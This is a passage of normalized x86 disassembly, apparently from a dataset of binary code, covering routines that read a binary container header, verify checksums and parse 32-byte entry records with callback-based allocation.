jmp r-xdata
cmp [ ebp - 0xc ] 0x4
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
or eax [ ebp - 0x8 ]
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov edx [ ebp + 0xc ]
push edx
call sub_404500
add esp 0x4
mov [ ebp - 0x94 ] eax
cmp [ ebp - 0x94 ] 0x0
je r-xdata
cmp [ ebp - 0xc ] 0x5
jne r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp + 0x2c ]
push edx
mov eax [ ebp + 0x28 ]
push eax
mov ecx [ ebp + 0x18 ]
push ecx
mov edx [ ebp + 0x14 ]
push edx
mov eax [ ebp + 0x10 ]
push eax
lea ecx [ ebp - 0x20 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
add eax 0x28
push eax
mov ecx [ ebp + 0xc ]
push ecx
call sub_4059b0
add esp 0x24
mov [ ebp - 0xa4 ] eax
cmp [ ebp - 0xa4 ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
call sub_404440
add esp 0x8
mov [ ebp - 0x9c ] eax
cmp [ ebp - 0x9c ] 0x0
je r-xdata
mov eax [ ebp - 0x94 ]
jmp r-xdata
mov eax 0x10
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ edx + 0x28 ]
add ecx [ eax + 0x20 ]
mov edx [ edx + 0x2c ]
adc edx [ eax + 0x24 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x28 ] ecx
mov [ eax + 0x2c ] edx
lea ecx [ ebp - 0xc ]
push ecx
mov edx [ ebp + 0xc ]
push edx
call sub_404440
add esp 0x8
mov [ ebp - 0xac ] eax
cmp [ ebp - 0xac ] 0x0
je r-xdata
mov eax [ ebp - 0xa4 ]
jmp r-xdata
mov eax [ ebp - 0x9c ]
jmp r-xdata
lea ecx [ ebp - 0x24 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
call sub_4043c0
add esp 0x8
mov [ ebp - 0xb0 ] eax
cmp [ ebp - 0xb0 ] 0x0
je r-xdata
mov eax [ ebp - 0xac ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x24 ]
mov [ eax + 0x1c ] ecx
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
mov eax [ ebp - 0xb0 ]
jmp r-xdata
mov edx [ ebp - 0x24 ]
shl edx 0x5
push edx
mov eax [ ebp + 0x28 ]
push eax
mov ecx [ ebp + 0x28 ]
mov edx [ ecx ]
call edx
add esp 0x8
mov [ ebp - 0x34 ] eax
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov [ ebp - 0x34 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x34 ]
mov [ eax + 0x10 ] ecx
mov [ ebp - 0x28 ] 0x0
jmp r-xdata
mov eax 0x2
jmp r-xdata
mov eax [ ebp - 0x28 ]
cmp eax [ ebp - 0x24 ]
jae r-xdata
lea edx [ ebp - 0x1c ]
push edx
mov eax [ ebp + 0xc ]
push eax
call sub_404440
add esp 0x8
mov [ ebp - 0x60 ] eax
cmp [ ebp - 0x60 ] 0x0
je r-xdata
mov ecx [ ebp - 0x28 ]
shl ecx 0x5
add ecx [ ebp - 0x34 ]
push ecx
call sub_403bc0
add esp 0x4
jmp r-xdata
mov ecx [ ebp - 0x1c ]
or ecx [ ebp - 0x18 ]
jne r-xdata
mov eax [ ebp - 0x60 ]
jmp r-xdata
mov edx [ ebp - 0x28 ]
add edx 0x1
mov [ ebp - 0x28 ] edx
lea edx [ ebp - 0x14 ]
push edx
mov eax [ ebp + 0xc ]
push eax
call sub_4042b0
add esp 0x8
mov [ ebp - 0x90 ] eax
cmp [ ebp - 0x90 ] 0x0
je r-xdata
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ecx + 0x4 ]
xor eax eax
mov [ ebp - 0xbc ] edx
mov [ ebp - 0xb8 ] eax
mov ecx [ ebp - 0x10 ]
cmp ecx [ ebp - 0xb8 ]
jb r-xdata
mov eax [ ebp - 0x90 ]
jmp r-xdata
mov [ ebp - 0x4c ] 0x0
mov [ ebp - 0x38 ] 0x0
mov [ ebp - 0x28 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x1c ]
cdq
mov [ ebp - 0xc4 ] eax
mov [ ebp - 0xc0 ] edx
mov eax [ ebp - 0xc4 ]
cmp eax [ ebp - 0x1c ]
jne r-xdata
ja r-xdata
mov edx [ ebp - 0x28 ]
cmp edx [ ebp - 0x24 ]
jae r-xdata
mov edx [ ebp - 0x10 ]
push edx
mov eax [ ebp - 0x14 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
call sub_404460
add esp 0xc
mov [ ebp - 0x54 ] eax
cmp [ ebp - 0x54 ] 0x0
je r-xdata
mov ecx [ ebp - 0xc0 ]
cmp ecx [ ebp - 0x18 ]
je r-xdata
mov eax 0x10
jmp r-xdata
mov edx [ ebp - 0x14 ]
cmp edx [ ebp - 0xbc ]
jbe r-xdata
mov edx [ ebp + 0x28 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_403e30
add esp 0x8
mov eax [ ebp - 0x28 ]
shl eax 0x5
add eax [ ebp - 0x34 ]
mov [ ebp - 0x2c ] eax
mov ecx [ ebp - 0x2c ]
mov [ ecx + 0x1a ] 0x0
mov edx [ ebp + 0x1c ]
cmp [ edx ] 0x0
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x54 ]
jmp r-xdata
mov edx [ ebp - 0x1c ]
mov [ ebp - 0x48 ] edx
mov eax [ ebp - 0x48 ]
sub eax 0xe
mov [ ebp - 0x48 ] eax
cmp [ ebp - 0x48 ] 0x7
ja r-xdata
mov ecx [ ebp + 0x1c ]
mov edx [ ecx ]
mov eax [ ebp - 0x28 ]
movzx ecx [ edx + eax ]
test ecx ecx
je r-xdata
mov eax [ ebp - 0x2c ]
mov [ eax + 0x18 ] 0x1
jmp r-xdata
jmp r-xdata
mov ecx [ ebp - 0x10 ]
push ecx
mov edx [ ebp - 0x14 ]
push edx
mov eax [ ebp + 0xc ]
push eax
call sub_404460
add esp 0xc
mov [ ebp - 0x7c ] eax
cmp [ ebp - 0x7c ] 0x0
je r-xdata
mov ecx [ ebp - 0x48 ]
jmp [ ecx * 4 + jump_table_4064c4 ]
mov [ ebp - 0x84 ] 0x1
mov [ ebp - 0x84 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x2c ]
movzx edx [ ecx + 0x18 ]
test edx edx
je r-xdata
mov eax [ ebp - 0x7c ]
jmp r-xdata
mov edx [ ebp + 0xc ]
push edx
call sub_404ac0
add esp 0x4
mov [ ebp - 0xa8 ] eax
cmp [ ebp - 0xa8 ] 0x0
je r-xdata
mov ecx [ ebp + 0x2c ]
push ecx
mov edx [ ebp + 0x1c ]
push edx
mov eax [ ebp - 0x24 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
call sub_4045e0
add esp 0x10
mov [ ebp - 0xb4 ] eax
cmp [ ebp - 0xb4 ] 0x0
je r-xdata
mov eax [ ebp + 0x2c ]
push eax
mov ecx [ ebp + 0x20 ]
push ecx
mov edx [ ebp - 0x44 ]
push edx
mov eax [ ebp + 0xc ]
push eax
call sub_4045e0
add esp 0x10
mov [ ebp - 0x80 ] eax
cmp [ ebp - 0x80 ] 0x0
je r-xdata
mov ecx [ ebp + 0x2c ]
push ecx
mov edx [ ebp + 0x24 ]
push edx
mov eax [ ebp - 0x24 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
call sub_4046c0
add esp 0x10
mov [ ebp - 0xa0 ] eax
cmp [ ebp - 0xa0 ] 0x0
je r-xdata
mov ecx [ ebp + 0x2c ]
push ecx
mov edx [ ebp + 0x24 ]
push edx
mov eax [ ebp - 0x24 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
call sub_4046c0
add esp 0x10
mov [ ebp - 0x5c ] eax
cmp [ ebp - 0x5c ] 0x0
je r-xdata
mov edx [ ebp + 0x20 ]
cmp [ edx ] 0x0
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ eax + 0x19 ] 0x0
mov ecx [ ebp + 0x10 ]
mov edx [ ecx ]
mov eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x38 ]
mov esi [ edx + ecx * 8 ]
mov [ eax + 0x8 ] esi
mov edx [ edx + ecx * 8 + 0x4 ]
mov [ eax + 0xc ] edx
mov eax [ ebp + 0x18 ]
mov ecx [ eax ]
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0x38 ]
mov ecx [ ecx + eax * 4 ]
mov [ edx + 0x10 ] ecx
mov edx [ ebp + 0x14 ]
mov eax [ edx ]
mov ecx [ ebp - 0x2c ]
mov edx [ ebp - 0x38 ]
mov al [ eax + edx ]
mov [ ecx + 0x1b ] al
mov ecx [ ebp - 0x38 ]
add ecx 0x1
mov [ ebp - 0x38 ] ecx
jmp r-xdata
mov edx [ ebp - 0x2c ]
mov al [ ebp - 0x84 ]
mov [ edx + 0x18 ] al
mov eax [ ebp - 0x14 ]
sub eax 0x1
mov [ ebp - 0x40 ] eax
mov ecx [ ebp - 0x40 ]
and ecx 0x1
je r-xdata
mov eax [ ebp - 0xa8 ]
jmp r-xdata
mov [ ebp - 0x44 ] 0x0
mov [ ebp - 0x28 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xb4 ]
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x80 ]
jmp r-xdata
mov edx [ ebp + 0xc ]
push edx
call sub_404ac0
add esp 0x4
mov [ ebp - 0x88 ] eax
cmp [ ebp - 0x88 ] 0x0
je r-xdata
mov eax [ ebp - 0xa0 ]
jmp r-xdata
mov edx [ ebp + 0xc ]
push edx
call sub_404ac0
add esp 0x4
mov [ ebp - 0x64 ] eax
cmp [ ebp - 0x64 ] 0x0
je r-xdata
mov eax [ ebp - 0x5c ]
jmp r-xdata
mov ecx [ ebp + 0x20 ]
mov edx [ ecx ]
mov eax [ ebp - 0x4c ]
movzx ecx [ edx + eax ]
test ecx ecx
je r-xdata
mov eax [ ebp - 0x2c ]
mov [ eax + 0x19 ] 0x1
jmp r-xdata
jmp r-xdata
mov edx [ ebp + 0x28 ]
push edx
mov eax [ ebp - 0x40 ]
push eax
mov ecx [ ebp + 0x8 ]
add ecx 0x44
push ecx
call sub_402320
add esp 0xc
test eax eax
jne r-xdata
mov eax 0x10
jmp r-xdata
mov eax [ ebp - 0x28 ]
cmp eax [ ebp - 0x24 ]
jae r-xdata
mov [ ebp - 0x28 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x88 ]
jmp r-xdata
mov [ ebp - 0x28 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x64 ]
jmp r-xdata
mov [ ebp - 0x8c ] 0x1
mov [ ebp - 0x8c ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x4c ]
add ecx 0x1
mov [ ebp - 0x4c ] ecx
mov edx [ ebp - 0x2c ]
mov [ edx + 0x8 ] 0x0
mov [ edx + 0xc ] 0x0
mov eax [ ebp - 0x2c ]
mov [ eax + 0x10 ] 0x0
mov ecx [ ebp - 0x2c ]
mov [ ecx + 0x1b ] 0x0
mov ecx [ ebp - 0x28 ]
add ecx 0x1
mov [ ebp - 0x28 ] ecx
mov edx [ ebp - 0x24 ]
add edx 0x1
jne r-xdata
mov eax 0x2
jmp r-xdata
jmp r-xdata
mov ecx [ ebp + 0x1c ]
mov edx [ ecx ]
mov eax [ ebp - 0x28 ]
movzx ecx [ edx + eax ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x28 ]
cmp ecx [ ebp - 0x24 ]
jae r-xdata
mov ecx [ ebp - 0x28 ]
cmp ecx [ ebp - 0x24 ]
jae r-xdata
mov edx [ ebp - 0x2c ]
mov al [ ebp - 0x8c ]
mov [ edx + 0x19 ] al
mov ecx [ ebp - 0x24 ]
lea edx [ ecx * 4 + 0x4 ]
push edx
mov eax [ ebp + 0x28 ]
push eax
mov ecx [ ebp + 0x28 ]
mov edx [ ecx ]
call edx
add esp 0x8
mov [ ebp - 0x70 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x70 ]
mov [ eax + 0x40 ] ecx
cmp [ ebp - 0x70 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x40 ] 0x0
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x44 ]
add edx 0x1
mov [ ebp - 0x44 ] edx
mov ecx [ ebp + 0x24 ]
mov edx [ ecx ]
push edx
mov eax [ ebp + 0x2c ]
push eax
mov ecx [ ebp + 0x2c ]
mov edx [ ecx + 0x4 ]
call edx
add esp 0x8
mov eax [ ebp + 0x24 ]
mov [ eax ] 0x0
jmp r-xdata
mov edx [ ebp - 0x28 ]
shl edx 0x5
add edx [ ebp - 0x34 ]
mov [ ebp - 0x50 ] edx
mov eax [ ebp + 0x24 ]
mov ecx [ eax ]
mov edx [ ebp - 0x28 ]
mov al [ ecx + edx ]
mov [ ebp - 0x2e ] al
mov ecx [ ebp - 0x50 ]
mov dl [ ebp - 0x2e ]
mov [ ecx + 0x1d ] dl
mov eax [ ebp - 0x50 ]
mov [ eax + 0x14 ] 0x0
movzx ecx [ ebp - 0x2e ]
test ecx ecx
je r-xdata
mov ecx [ ebp + 0x24 ]
mov edx [ ecx ]
push edx
mov eax [ ebp + 0x2c ]
push eax
mov ecx [ ebp + 0x2c ]
mov edx [ ecx + 0x4 ]
call edx
add esp 0x8
mov eax [ ebp + 0x24 ]
mov [ eax ] 0x0
jmp r-xdata
mov edx [ ebp - 0x28 ]
shl edx 0x5
add edx [ ebp - 0x34 ]
mov [ ebp - 0x3c ] edx
mov eax [ ebp + 0x24 ]
mov ecx [ eax ]
mov edx [ ebp - 0x28 ]
mov al [ ecx + edx ]
mov [ ebp - 0x2d ] al
mov ecx [ ebp - 0x3c ]
mov dl [ ebp - 0x2d ]
mov [ ecx + 0x1c ] dl
mov eax [ ebp - 0x3c ]
mov [ eax + 0x4 ] 0x0
mov ecx [ ebp - 0x3c ]
mov [ ecx ] 0x0
movzx edx [ ebp - 0x2d ]
test edx edx
je r-xdata
mov edx [ ebp - 0x40 ]
push edx
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x44 ]
push eax
call sub_424fc0
add esp 0xc
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x40 ]
push edx
mov eax [ ebp - 0x24 ]
push eax
mov ecx [ ebp - 0x40 ]
shr ecx 0x1
push ecx
mov edx [ ebp + 0xc ]
mov eax [ edx ]
push eax
call sub_405ba0
add esp 0x10
mov [ ebp - 0x98 ] eax
cmp [ ebp - 0x98 ] 0x0
je r-xdata
mov eax 0x2
jmp r-xdata
mov edx [ ebp - 0x28 ]
add edx 0x1
mov [ ebp - 0x28 ] edx
jmp r-xdata
mov edx [ ebp - 0x50 ]
add edx 0x14
push edx
mov eax [ ebp + 0xc ]
push eax
call sub_404230
add esp 0x8
mov [ ebp - 0x58 ] eax
cmp [ ebp - 0x58 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x3c ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
call sub_404230
add esp 0x8
mov [ ebp - 0x6c ] eax
cmp [ ebp - 0x6c ] 0x0
je r-xdata
mov ecx [ ebp - 0x40 ]
xor edx edx
push edx
push ecx
mov eax [ ebp + 0xc ]
push eax
call sub_404460
add esp 0xc
mov [ ebp - 0x78 ] eax
cmp [ ebp - 0x78 ] 0x0
je r-xdata
mov eax [ ebp - 0x98 ]
jmp r-xdata
mov eax [ ebp - 0x28 ]
add eax 0x1
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x58 ]
jmp r-xdata
mov eax [ ebp - 0x28 ]
add eax 0x1
mov [ ebp - 0x28 ] eax
mov edx [ ebp - 0x3c ]
add edx 0x4
push edx
mov eax [ ebp + 0xc ]
push eax
call sub_404230
add esp 0x8
mov [ ebp - 0x74 ] eax
cmp [ ebp - 0x74 ] 0x0
je r-xdata
mov eax [ ebp - 0x6c ]
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x78 ]
jmp r-xdata
mov eax [ ebp - 0x74 ]
jmp r-xdata
sub_4064f0
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0x18 ] 0x0
mov eax [ ebp + 0x14 ]
push eax
mov ecx [ ebp + 0x10 ]
push ecx
lea edx [ ebp - 0x18 ]
push edx
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x8 ]
push ecx
lea edx [ ebp - 0x14 ]
push edx
lea eax [ ebp - 0x1c ]
push eax
lea ecx [ ebp - 0xc ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_405c50
add esp 0x28
mov [ ebp - 0x20 ] eax
mov ecx [ ebp - 0xc ]
push ecx
mov edx [ ebp + 0x14 ]
push edx
mov eax [ ebp + 0x14 ]
mov ecx [ eax + 0x4 ]
call ecx
add esp 0x8
mov edx [ ebp - 0x1c ]
push edx
mov eax [ ebp + 0x14 ]
push eax
mov ecx [ ebp + 0x14 ]
mov edx [ ecx + 0x4 ]
call edx
add esp 0x8
mov eax [ ebp - 0x14 ]
push eax
mov ecx [ ebp + 0x14 ]
push ecx
mov edx [ ebp + 0x14 ]
mov eax [ edx + 0x4 ]
call eax
add esp 0x8
mov ecx [ ebp - 0x8 ]
push ecx
mov edx [ ebp + 0x14 ]
push edx
mov eax [ ebp + 0x14 ]
mov ecx [ eax + 0x4 ]
call ecx
add esp 0x8
mov edx [ ebp - 0x10 ]
push edx
mov eax [ ebp + 0x14 ]
push eax
mov ecx [ ebp + 0x14 ]
mov edx [ ecx + 0x4 ]
call edx
add esp 0x8
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp + 0x14 ]
push ecx
mov edx [ ebp + 0x14 ]
mov eax [ edx + 0x4 ]
call eax
add esp 0x8
mov eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn
sub_4065e0
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x10 ] 0x0
mov eax [ ebp + 0x2c ]
push eax
mov ecx [ ebp + 0x2c ]
push ecx
mov edx [ ebp + 0x28 ]
push edx
mov eax [ ebp + 0x24 ]
push eax
mov ecx [ ebp + 0x20 ]
push ecx
lea edx [ ebp - 0x10 ]
push edx
mov eax [ ebp + 0x1c ]
push eax
lea ecx [ ebp - 0xc ]
push ecx
mov edx [ ebp + 0xc ]
push edx
call sub_4059b0
add esp 0x24
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x20 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
add eax [ ebp + 0x14 ]
mov ecx [ ebp - 0x8 ]
adc ecx [ ebp + 0x18 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] ecx
mov edx [ ebp + 0x1c ]
cmp [ edx + 0x18 ] 0x1
je r-xdata
mov eax [ ebp - 0x20 ]
jmp r-xdata
mov eax [ ebp + 0x1c ]
mov ecx [ eax + 0xc ]
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x14 ]
push edx
call sub_403b50
add esp 0x4
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] edx
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_407840
add esp 0xc
mov [ ebp - 0x1c ] eax
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov eax 0x10
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x2c ]
push eax
mov ecx [ ebp - 0x28 ]
push ecx
mov edx [ ebp + 0x10 ]
push edx
call sub_402320
add esp 0xc
test eax eax
jne r-xdata
mov eax [ ebp - 0x1c ]
jmp r-xdata
mov eax [ ebp + 0x2c ]
push eax
mov ecx [ ebp - 0x28 ]
push ecx
mov edx [ ebp + 0x10 ]
mov eax [ edx ]
push eax
mov ecx [ ebp - 0x8 ]
push ecx
mov edx [ ebp - 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x1c ]
mov edx [ ecx ]
push edx
mov eax [ ebp - 0x14 ]
push eax
call sub_403490
add esp 0x20
mov [ ebp - 0x2c ] eax
mov ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] ecx
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax 0x2
jmp r-xdata
mov edx [ ebp - 0x14 ]
cmp [ edx + 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
jmp r-xdata
xor eax eax
mov edx [ ebp - 0x28 ]
mov eax [ ebp + 0x10 ]
mov ecx [ eax ]
call sub_4023b0
mov ecx [ ebp - 0x14 ]
cmp eax [ ecx + 0x20 ]
je r-xdata
mov eax 0x3
jmp r-xdata
sub_406730
push ebp
mov ebp esp
sub esp 0x34
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x30 ] 0x0
mov [ ebp - 0x2c ] 0x0
mov [ ebp - 0x28 ] 0x0
lea eax [ ebp - 0x24 ]
push eax
call sub_403bf0
add esp 0x4
mov ecx [ ebp + 0x1c ]
push ecx
lea edx [ ebp - 0x28 ]
push edx
lea eax [ ebp - 0x2c ]
push eax
lea ecx [ ebp - 0x30 ]
push ecx
lea edx [ ebp - 0x24 ]
push edx
mov eax [ ebp + 0x18 ]
push eax
mov ecx [ ebp + 0x14 ]
push ecx
mov edx [ ebp + 0x10 ]
push edx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_4065e0
add esp 0x28
mov [ ebp - 0x34 ] eax
mov edx [ ebp + 0x1c ]
push edx
lea eax [ ebp - 0x24 ]
push eax
call sub_403c50
add esp 0x8
mov ecx [ ebp - 0x30 ]
push ecx
mov edx [ ebp + 0x1c ]
push edx
mov eax [ ebp + 0x1c ]
mov ecx [ eax + 0x4 ]
call ecx
add esp 0x8
mov edx [ ebp - 0x2c ]
push edx
mov eax [ ebp + 0x1c ]
push eax
mov ecx [ ebp + 0x1c ]
mov edx [ ecx + 0x4 ]
call edx
add esp 0x8
mov eax [ ebp - 0x28 ]
push eax
mov ecx [ ebp + 0x1c ]
push ecx
mov edx [ ebp + 0x1c ]
mov eax [ edx + 0x4 ]
call eax
add esp 0x8
mov eax [ ebp - 0x34 ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn
sub_4067f0
push ebp
mov ebp esp
sub esp 0xb0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
xorpd xmm0 xmm0
movlpd [ ebp - 0x2c ] xmm0
push 0x1
lea eax [ ebp - 0x2c ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0xc ]
mov eax [ edx + 0xc ]
call eax
add esp 0xc
mov [ ebp - 0x7c ] eax
cmp [ ebp - 0x7c ] 0x0
je r-xdata
push 0x11
push 0x20
lea ecx [ ebp - 0x24 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
call sub_407880
add esp 0x10
mov [ ebp - 0x70 ] eax
cmp [ ebp - 0x70 ] 0x0
je r-xdata
mov eax [ ebp - 0x7c ]
jmp r-xdata
lea eax [ ebp - 0x24 ]
push eax
call sub_404150
add esp 0x4
test eax eax
jne r-xdata
mov eax [ ebp - 0x70 ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn
mov ecx 0x1
imul ecx ecx 0x6
movzx edx [ ebp + ecx - 0x24 ]
test edx edx
je r-xdata
mov eax 0x11
jmp r-xdata
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x60 ] eax
mov ecx [ ebp - 0x14 ]
mov [ ebp - 0x5c ] ecx
mov edx [ ebp - 0x10 ]
mov [ ebp - 0x6c ] edx
mov eax [ ebp - 0xc ]
mov [ ebp - 0x68 ] eax
mov ecx [ ebp - 0x8 ]
mov [ ebp - 0xa8 ] ecx
mov edx [ ebp - 0x2c ]
add edx 0x20
mov eax [ ebp - 0x28 ]
adc eax 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x20 ] edx
mov [ ecx + 0x24 ] eax
lea ecx [ ebp - 0x18 ]
mov edx 0x14
call sub_4023b0
cmp eax [ ebp - 0x1c ]
je r-xdata
mov eax 0x4
jmp r-xdata
mov edx [ ebp - 0x6c ]
mov [ ebp - 0x64 ] edx
mov eax [ ebp - 0x64 ]
xor ecx ecx
mov [ ebp - 0xb0 ] eax
mov [ ebp - 0xac ] ecx
mov edx [ ebp - 0xb0 ]
cmp edx [ ebp - 0x6c ]
jne r-xdata
mov eax 0x3
jmp r-xdata
mov eax 0x2
jmp r-xdata
mov eax [ ebp - 0xac ]
cmp eax [ ebp - 0x68 ]
je r-xdata
cmp [ ebp - 0x64 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x60 ]
add ecx [ ebp - 0x6c ]
mov edx [ ebp - 0x5c ]
adc edx [ ebp - 0x68 ]
mov [ ebp - 0x84 ] ecx
mov [ ebp - 0x80 ] edx
mov eax [ ebp - 0x5c ]
cmp eax [ ebp - 0x80 ]
ja r-xdata
xor eax eax
jmp r-xdata
mov eax 0x11
jmp r-xdata
jb r-xdata
mov edx [ ebp - 0x60 ]
add edx [ ebp - 0x6c ]
mov eax [ ebp - 0x5c ]
adc eax [ ebp - 0x68 ]
add edx 0x20
adc eax 0x0
mov [ ebp - 0x9c ] edx
mov [ ebp - 0x98 ] eax
mov ecx [ ebp - 0x5c ]
cmp ecx [ ebp - 0x98 ]
jb r-xdata
mov ecx [ ebp - 0x60 ]
cmp ecx [ ebp - 0x84 ]
ja r-xdata
xorpd xmm0 xmm0
movlpd [ ebp - 0x34 ] xmm0
push 0x2
lea eax [ ebp - 0x34 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0xc ]
mov eax [ edx + 0xc ]
call eax
add esp 0xc
mov [ ebp - 0x78 ] eax
cmp [ ebp - 0x78 ] 0x0
je r-xdata
ja r-xdata
mov ecx [ ebp - 0x2c ]
add ecx [ ebp - 0x60 ]
mov edx [ ebp - 0x28 ]
adc edx [ ebp - 0x5c ]
mov [ ebp - 0x8c ] ecx
mov [ ebp - 0x88 ] edx
mov eax [ ebp - 0x30 ]
cmp eax [ ebp - 0x88 ]
jb r-xdata
mov eax [ ebp - 0x78 ]
jmp r-xdata
mov edx [ ebp - 0x60 ]
cmp edx [ ebp - 0x9c ]
jbe r-xdata
mov eax 0x6
jmp r-xdata
ja r-xdata
mov edx [ ebp - 0x2c ]
add edx 0x20
mov eax [ ebp - 0x28 ]
adc eax 0x0
add edx [ ebp - 0x60 ]
adc eax [ ebp - 0x5c ]
mov [ ebp - 0x94 ] edx
mov [ ebp - 0x90 ] eax
mov ecx [ ebp - 0x30 ]
cmp ecx [ ebp - 0x90 ]
jb r-xdata
mov ecx [ ebp - 0x34 ]
cmp ecx [ ebp - 0x8c ]
jb r-xdata
ja r-xdata
mov eax [ ebp - 0x2c ]
add eax 0x20
mov ecx [ ebp - 0x28 ]
adc ecx 0x0
add eax [ ebp - 0x60 ]
adc ecx [ ebp - 0x5c ]
add eax [ ebp - 0x6c ]
adc ecx [ ebp - 0x68 ]
mov [ ebp - 0xa4 ] eax
mov [ ebp - 0xa0 ] ecx
mov edx [ ebp - 0x30 ]
cmp edx [ ebp - 0xa0 ]
ja r-xdata
mov edx [ ebp - 0x34 ]
cmp edx [ ebp - 0x94 ]
jb r-xdata
mov ecx [ ebp - 0x2c ]
add ecx 0x20
mov edx [ ebp - 0x28 ]
adc edx 0x0
add ecx [ ebp - 0x60 ]
adc edx [ ebp - 0x5c ]
push edx
push ecx
mov eax [ ebp + 0xc ]
push eax
call sub_407840
add esp 0xc
mov [ ebp - 0x74 ] eax
cmp [ ebp - 0x74 ] 0x0
je r-xdata
jb r-xdata
mov ecx [ ebp + 0x14 ]
push ecx
mov edx [ ebp - 0x64 ]
push edx
lea eax [ ebp - 0x44 ]
push eax
call sub_402320
add esp 0xc
test eax eax
jne r-xdata
mov eax [ ebp - 0x74 ]
jmp r-xdata
mov eax [ ebp - 0x34 ]
cmp eax [ ebp - 0xa4 ]
jae r-xdata
mov ecx [ ebp - 0x64 ]
push ecx
mov edx [ ebp - 0x44 ]
push edx
mov eax [ ebp + 0xc ]
push eax
call sub_4078f0
add esp 0xc
mov [ ebp - 0x58 ] eax
cmp [ ebp - 0x58 ] 0x0
jne r-xdata
mov eax 0x2
jmp r-xdata
mov eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp - 0x44 ]
push ecx
call sub_402380
add esp 0x8
mov eax [ ebp - 0x58 ]
mov [ ebp - 0x58 ] 0x10
mov edx [ ebp - 0x64 ]
mov ecx [ ebp - 0x44 ]
